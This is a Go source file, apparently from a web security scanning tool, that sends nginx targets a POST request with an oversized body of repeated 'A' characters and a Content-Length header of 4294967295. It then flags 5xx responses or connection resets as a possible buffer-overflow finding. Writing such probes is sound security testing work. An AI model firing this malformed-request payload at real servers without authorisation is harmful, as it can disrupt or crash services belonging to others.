package nginx

import (
	"context"
	"net/url"
	"strings"
	"time"

	methodwebtest "github.com/Method-Security/methodwebtest/generated/go"
	"github.com/Method-Security/methodwebtest/utils"
)

func PerformNginxHeaderBufferOverflowInjection(ctx context.Context, config *methodwebtest.HeaderBufferOverflowConfig) methodwebtest.Report {
	report := methodwebtest.Report{}
	var allErrors []string

	var targets []*methodwebtest.TargetInfo
	for _, target := range config.Targets {
		targetInfo := methodwebtest.TargetInfo{Target: target, RequestCount: 1, StartTimestamp: time.Now()}
		attempt := methodwebtest.AttemptInfo{}

		// Split target
		baseURL, parsedPath, err := utils.SplitTarget(target)
		if err != nil {
			allErrors = append(allErrors, err.Error())
			continue
		}

		// Parse out host
		parsedURL, err := url.Parse(target)
		if err != nil {
			allErrors = append(allErrors, err.Error())
			continue
		}

		headerParams, bodyParams := generateBufferOverflowContent(parsedURL.Host, config.BodySize)

		// Send request
		startTime := time.Now()
		request := utils.PerformRequestScan(
			baseURL,
			parsedPath,
			methodwebtest.HttpMethodPost,
			methodwebtest.RequestParams{HeaderParams: headerParams, BodyParams: bodyParams},
			[]*methodwebtest.EventType{methodwebtest.NewEventTypeFromHeaderEvent(methodwebtest.HeaderEventServeroverload)},
			config.Timeout, false)
		endTime := time.Now()

		// Marshal data
		attempt.Finding = DetectNginxBufferOverflow(&request)
		attempt.TimeSent = startTime
		attempt.TimeReceived = &endTime
		attempt.Request = &request

		targetInfo.Attempts = []*methodwebtest.AttemptInfo{&attempt}
		targetInfo.EndTimestamp = time.Now()
		targets = append(targets, &targetInfo)
	}
	report.Targets = targets
	report.Errors = allErrors
	return report
}

func generateBufferOverflowContent(host string, bodySize int) (map[string]string, string) {
	payload := strings.Repeat("A", bodySize)
	headers := map[string]string{
		"Host":           host,
		"Content-Length": "4294967295",
		"Connection":     "close",
	}

	return headers, payload
}

func DetectNginxBufferOverflow(requestInfo *methodwebtest.RequestInfo) *bool {
	finding := false

	// Check for abnormal status codes (e.g., 500 or 503)
	if requestInfo.StatusCode != nil && *requestInfo.StatusCode >= 500 && *requestInfo.StatusCode < 600 {
		finding = true
	}

	// Check the response body for potential error messages
	if requestInfo.ResponseBody != nil {
		body := *requestInfo.ResponseBody
		if strings.Contains(body, "buffer overflow") || strings.Contains(body, "internal server error") || strings.Contains(body, "connection reset") {
			finding = true
		}
	}

	// Check if the server prematurely closed the connection
	if requestInfo.Errors != nil {
		for _, err := range requestInfo.Errors {
			if strings.Contains(err, "connection reset") || strings.Contains(err, "EOF") {
				finding = true
			}
		}
	}

	return &finding
}
